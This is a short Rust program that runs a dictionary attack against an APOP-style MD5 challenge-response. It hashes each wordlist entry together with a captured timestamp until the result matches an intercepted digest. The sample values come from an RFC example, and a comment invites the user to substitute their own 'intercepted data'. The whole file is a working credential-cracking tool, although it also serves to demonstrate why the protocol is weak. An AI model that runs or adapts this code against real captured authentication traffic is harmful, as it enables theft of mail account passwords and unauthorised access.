use std::fs;

// Data from RC example, please update according to your intercepted data
const HASH: &str = "c4c9334bac560ecc979e58001b3e22fb";
const TIMESTAMP: &str = "<1896.697170952@dbc.mtview.ca.us>";
const DICTIONARY_PATH: &str = "/your_favorite_wordlist.txt";

fn main() {
    let raw_dictionary =
        fs::read_to_string(DICTIONARY_PATH).expect("Unable to read dictionary file");

    let dictionary = raw_dictionary.lines();

    for password in dictionary {
        let secret = format!("{}{}", TIMESTAMP, password);
        println!("Testing secret {}", secret);

        let digest = md5::compute(secret);
        println!("Resulting digest {:x}", digest);

        if format!("{:x}", digest) == HASH {
            println!("Cracked! Secret is {}", password);
            break;
        }
    }
}